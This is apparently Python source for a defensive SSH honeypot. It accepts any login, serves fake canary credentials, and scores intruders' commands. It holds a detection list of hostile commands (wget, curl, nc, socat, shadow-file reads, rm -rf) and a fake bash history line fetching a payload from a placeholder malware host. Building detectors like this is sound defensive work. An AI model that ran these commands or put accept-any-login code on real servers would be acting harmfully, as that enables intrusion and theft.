import asyncio
import asyncssh
import uuid
import logging
from typing import Optional, Dict
from app.core.config import settings
from app.core.db import get_conn
from app.verdict.engine import verdict_engine
from app.verdict.session_layer import session_layer

logger = logging.getLogger(__name__)

# Fake virtual filesystem for trap mode
VIRTUAL_FS = {
    "/etc/shadow": b"root:$6$CANARY$fake_hash_for_canary_detection:19000:0:99999:7:::\n",
    "/root/.ssh/id_rsa": b"-----BEGIN RSA PRIVATE KEY-----\nCANARY_KEY_DO_NOT_USE\n-----END RSA PRIVATE KEY-----\n",
    "/root/secrets.txt": b"STING_CANARY: api_key=sk-fake12345\ndatabase_password=CANARY_PASSWORD\n",
    "/root/.bash_history": b"ssh root@192.168.1.1\ncat /etc/shadow\nwget http://malware.example.com/payload\n",
    "/etc/passwd": b"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
}

# Commands that raise score
HOSTILE_COMMANDS = {
    "wget": "download_tool", "curl": "download_tool", "tftp": "download_tool",
    "chmod +s": "privilege_escalation", "sudo su": "privilege_escalation",
    "useradd": "privilege_escalation", "passwd": "privilege_escalation",
    "nc ": "lateral_movement", "ncat": "lateral_movement", "socat": "lateral_movement",
    "dd if=": "data_exfiltration", "tar czf": "data_exfiltration",
    "cat /etc/shadow": "file_read_canary", "cat /root/secrets": "file_read_canary",
    "rm -rf": "file_delete",
}

CLEAN_COMMANDS = {"ls", "pwd", "whoami", "id", "echo", "date", "uname", "hostname"}


class STINGSSHServer(asyncssh.SSHServer):
    def __init__(self):
        self._session_id: Optional[str] = None
        self._client_addr: Optional[str] = None
        self._buf = None

    def connection_made(self, conn):
        peer = conn.get_extra_info('peername')
        self._client_addr = peer[0] if peer else "unknown"
        self._session_id = str(uuid.uuid4())
        logger.info(f"SSH connection from {self._client_addr} → session {self._session_id}")
        asyncio.create_task(self._init_session(conn))

    async def _init_session(self, conn):
        self._buf = await session_layer.create(self._session_id, self._client_addr)
        await verdict_engine.init_session(self._session_id)
        async with get_conn() as db:
            await db.execute("""
                INSERT INTO sessions (id, source_ip, protocol, score, state)
                VALUES ($1::uuid, $2, 'ssh', 100, 'hostile')
            """, self._session_id, self._client_addr)
        await verdict_engine.score_event(self._session_id, "connection_attempt")

    def password_auth_supported(self) -> bool:
        return True  # Accept password auth — trap mode

    def validate_password(self, username: str, password: str) -> bool:
        """Accept any password — this is the honeypot trap."""
        asyncio.create_task(self._handle_auth(username, True))
        return True

    def public_key_auth_supported(self) -> bool:
        return True  # Accept pubkey auth — trap mode

    def validate_public_key(self, username: str, key) -> bool:
        """Accept any public key — trap mode."""
        asyncio.create_task(self._handle_auth(username, True))
        return True

    async def _handle_auth(self, username: str, result: bool):
        if not result:
            score = await verdict_engine.score_event(self._session_id, "auth_failure")
        else:
            score = await verdict_engine.score_event(self._session_id, "auth_success")
            async with get_conn() as db:
                await db.execute(
                    "UPDATE sessions SET username=$1 WHERE id=$2::uuid",
                    username, self._session_id
                )

    def session_requested(self) -> 'STINGSSHSession':
        return STINGSSHSession(self._session_id, self._client_addr, self._buf)

    def connection_lost(self, exc):
        if self._session_id:
            asyncio.create_task(self._close_session())

    async def _close_session(self):
        async with get_conn() as db:
            await db.execute(
                "UPDATE sessions SET ended_at=NOW() WHERE id=$1::uuid AND ended_at IS NULL",
                self._session_id
            )
        await verdict_engine.remove_session(self._session_id)


class STINGSSHSession(asyncssh.SSHServerSession):
    def __init__(self, session_id: str, client_addr: str, buf):
        self._session_id = session_id
        self._client_addr = client_addr
        self._buf = buf
        self._chan = None

    def connection_made(self, chan):
        self._chan = chan

    def shell_requested(self) -> bool:
        return True

    def exec_requested(self, command: str) -> bool:
        asyncio.create_task(self._handle_command(command))
        return True

    async def _handle_command(self, cmd: str):
        cmd_lower = cmd.lower().strip()
        await self._buf.log_command(cmd)

        # Classify command
        event_type = "command_executed"
        for pattern, etype in HOSTILE_COMMANDS.items():
            if pattern in cmd_lower:
                event_type = etype
                break
        else:
            base = cmd_lower.split()[0] if cmd_lower else ""
            if base in CLEAN_COMMANDS:
                event_type = "clean_command"

        score = await verdict_engine.score_event(self._session_id, event_type)

        # Log to DB
        async with get_conn() as db:
            await db.execute("""
                INSERT INTO events (session_id, event_type, data, score_delta)
                VALUES ($1::uuid, $2, $3::jsonb, $4)
            """, self._session_id, event_type,
                '{"cmd": "' + cmd.replace('"', '\\"') + '"}',
                SCORE_RULES_MAP.get(event_type, 0))

        is_hostile = verdict_engine.is_hostile(self._session_id)
        response = self._generate_response(cmd, is_hostile)
        if self._chan:
            self._chan.write(response + "\n")
            self._chan.exit(0)

    def _generate_response(self, cmd: str, is_hostile: bool) -> str:
        """Return fake or real-ish responses for trap mode."""
        cmd_lower = cmd.lower().strip()
        if not is_hostile:
            return f"bash: {cmd}: command not found"

        if cmd_lower.startswith("ls"):
            return "bin  boot  dev  etc  home  lib  media  mnt  opt  proc  root  run  srv  sys  tmp  usr  var"
        elif cmd_lower == "whoami":
            return "root"
        elif cmd_lower == "id":
            return "uid=0(root) gid=0(root) groups=0(root)"
        elif cmd_lower == "uname -a":
            return "Linux honeypot 5.15.0-76-generic #83-Ubuntu SMP Thu Jun 15 19:16:32 UTC 2023 x86_64 GNU/Linux"
        elif "cat /etc/shadow" in cmd_lower:
            return VIRTUAL_FS["/etc/shadow"].decode()
        elif "cat /root/secrets" in cmd_lower:
            return VIRTUAL_FS["/root/secrets.txt"].decode()
        else:
            return ""

    def data_received(self, data, datatype):
        pass

    def eof_received(self):
        pass


SCORE_RULES_MAP = {
    "connection_attempt": 0,
    "auth_failure": 15,
    "auth_success": -10,
    "command_executed": 5,
    "file_read_canary": 40,
    "file_write": 10,
    "file_delete": 20,
    "download_tool": 30,
    "privilege_escalation": 40,
    "lateral_movement": 35,
    "data_exfiltration": 45,
    "canary_dns": 50,
    "canary_token": 50,
    "clean_command": -5,
}


async def start_ssh_proxy(host_keys: list = None):
    """Start the STING SSH proxy server."""
    if host_keys is None:
        # Generate ephemeral key for dev
        key = asyncssh.generate_private_key('ssh-rsa')
        host_keys = [key]

    server = await asyncssh.create_server(
        STINGSSHServer,
        host='0.0.0.0',
        port=settings.ssh_proxy_port,
        server_host_keys=host_keys,
        process_factory=None,
    )
    logger.info(f"STING SSH proxy listening on :{settings.ssh_proxy_port}")
    return server
